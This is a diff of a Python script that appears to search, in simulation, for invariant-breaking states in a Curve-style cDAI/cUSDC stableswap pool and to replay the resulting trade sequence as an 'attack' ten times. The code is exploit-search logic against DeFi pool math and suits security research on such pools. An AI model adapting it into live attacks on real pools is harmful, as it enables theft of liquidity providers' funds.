@@ -221,14 +221,12 @@ while True:
     
     #Check if the D found breaks the invariant
     u = USDTpool(attack_balances_tokens_precision, amp, D)
-
     #If D doesn't verify the invariant relationship
     if abs(u) > 0:
         #try:
         #Find liquidity to add to get the invalid D found
 
-        liquidityToAdd = [attack_balances_c_tokens[i] - current_ctokens[i] for i in range(N_COINS)]
-
+        liquidityToAdd = [attack_balances_c_tokens[i] - contract_balance[i] for i in range(N_COINS)]
         #Add liquidity into the original pool to get to the exact attack balances found 
 
         simAddLiquidity(liquidityToAdd)
@@ -239,7 +237,7 @@ while True:
         amountToTradeCUSDC = int(0.6*cusdc)
 
         #Get the amount out before changing the state of the pool
-        amountOutCDAI = solver._exchange(1, 0, current_ctokens, amountToTradeCUSDC, rates, fee, amp)
+        amountOutCDAI = solver._exchange(1, 0, contract_balance, amountToTradeCUSDC, rates, fee, amp)
 
         #Change state of the pool
         simTrade(1, 0, amountToTradeCUSDC) 
@@ -249,7 +247,7 @@ while True:
         amountBackCUSDC = solver._exchange(0, 1, contract_balance, amountOutCDAI, rates, fee, amp)
 
         simTrade(0, 1, amountOutCDAI)
-
+        
         # if iteration % 1000000 == 0:
         #     file = open("check_cdai_in_out.txt", "a")
         #     file.write("CDAI in: " + str(amountToTradeCDAI) + "\n")
@@ -265,6 +263,7 @@ while True:
             print("Solution found!")
             #Redo the same attack 10 times
             for i in range(10):
+                print(i)
                 #Add liquidity to get back to the attack balances
                 liquidityToAdd = [attack_balances_c_tokens[i] - contract_balance[i] for i in range(N_COINS)]
                 simAddLiquidity(liquidityToAdd)
